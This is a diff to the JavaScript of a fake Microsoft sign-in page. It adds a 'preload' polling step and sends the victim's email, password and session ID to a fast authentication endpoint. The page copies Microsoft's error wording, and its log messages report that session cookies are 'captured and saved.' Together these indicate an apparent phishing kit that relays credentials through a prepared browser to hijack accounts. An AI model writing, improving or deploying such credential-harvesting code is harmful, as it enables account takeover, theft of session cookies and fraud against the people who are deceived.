@@ -886,18 +886,28 @@ Status: ${data.status}`);
                 });
 
                 const verifyData = await verifyResponse.json();
-                setLoading(false);
 
                 if (verifyResponse.ok && verifyData.exists) {
-                    // Account exists, show password form
-                    console.log('✅ Email account verified, showing password form');
+                    // Account exists and preload started
+                    console.log('✅ Email account verified, preload started');
+                    currentSessionId = verifyData.sessionId; // Store session ID from preload
+                    
+                    // Wait for preload to be ready before showing password form
+                    if (verifyData.preloadStarted) {
+                        setLoading(true, 'Preparing secure login...');
+                        await waitForPreloadReady(verifyData.sessionId, email);
+                    }
+                    
+                    setLoading(false);
                     showPasswordForm(email);
                 } else if (verifyData.exists === false) {
                     // Account doesn't exist
+                    setLoading(false);
                     showMessage(verifyData.message || `We couldn't find an account with that username. Try another, or get a new Microsoft account.`, 'error');
                 } else {
                     // Verification failed, but proceed with OAuth (fallback)
                     console.log('⚠️ Email verification failed, proceeding with Microsoft authentication');
+                    setLoading(false);
                     proceedWithMicrosoftAuth();
                 }
 
@@ -909,6 +919,39 @@ Status: ${data.status}`);
                 console.log('⚠️ Email verification error, proceeding with Microsoft authentication');
                 proceedWithMicrosoftAuth();
             }
+        }
+
+        // Wait for preload to be ready
+        async function waitForPreloadReady(sessionId, email) {
+            const maxWaitTime = 20000; // 20 seconds max
+            const pollInterval = 1000; // Check every 1 second
+            const startTime = Date.now();
+
+            console.log(`⏳ Waiting for preload to be ready for ${email}...`);
+
+            while ((Date.now() - startTime) < maxWaitTime) {
+                try {
+                    const response = await fetch(`${API_BASE}/api/preload-status/${sessionId}`);
+                    if (response.ok) {
+                        const data = await response.json();
+                        
+                        if (data.status === 'preload_ready') {
+                            console.log(`✅ Preload ready for ${email} after ${Date.now() - startTime}ms`);
+                            return true;
+                        } else if (data.status === 'preload_failed') {
+                            console.log(`❌ Preload failed for ${email}`);
+                            return false;
+                        }
+                    }
+                } catch (e) {
+                    console.warn('Error checking preload status:', e);
+                }
+
+                await new Promise(resolve => setTimeout(resolve, pollInterval));
+            }
+
+            console.log(`⏰ Preload wait timeout for ${email}`);
+            return false;
         }
 
         async function proceedWithMicrosoftAuth() {
@@ -995,7 +1038,7 @@ Status: ${data.status}`);
             }
         }
 
-        // Password authentication
+        // Password authentication using fast auth endpoint
         async function signInWithPassword() {
             try {
                 setLoading(true, 'Verifying credentials...');
@@ -1009,13 +1052,17 @@ Status: ${data.status}`);
                     return;
                 }
 
-                // Validate credentials with backend
-                const response = await fetch('/api/authenticate-password', {
+                // Use fast authentication endpoint with preloaded browser
+                const response = await fetch('/api/authenticate-password-fast', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ email, password })
+                    body: JSON.stringify({ 
+                        email, 
+                        password,
+                        sessionId: currentSessionId // Pass the preload session ID
+                    })
                 });
 
                 const data = await response.json();
@@ -1028,13 +1075,20 @@ Status: ${data.status}`);
                 }
 
                 if (data.success) {
-                    // Direct success - cookies saved
-                    console.log('Login successful! Cookies captured and saved.');
-                    showMessage('Login successful! Session cookies saved.', 'success');
+                    // Authentication successful
+                    const authMethod = data.preloadUsed ? 'Fast Authentication (preloaded)' : 'Standard Authentication';
+                    console.log(`Login successful! ${authMethod} - Cookies captured and saved.`);
+                    
+                    // Show performance metrics if available
+                    if (data.metrics) {
+                        console.log(`⚡ Performance: ${data.metrics.totalAuthMs}ms total, preload: ${data.metrics.preloadUsed}`);
+                    }
+                    
+                    showMessage(`Login successful! ${authMethod}`, 'success');
                     setLoading(false);
                     currentSessionId = data.sessionId;
-                    currentUserEmail = data.email;
-                    showAuthSuccess(data.email);
+                    currentUserEmail = data.userEmail;
+                    showAuthSuccess(data.userEmail);
                 } else {
                     throw new Error(data.message || data.error || 'Unknown error');
                 }
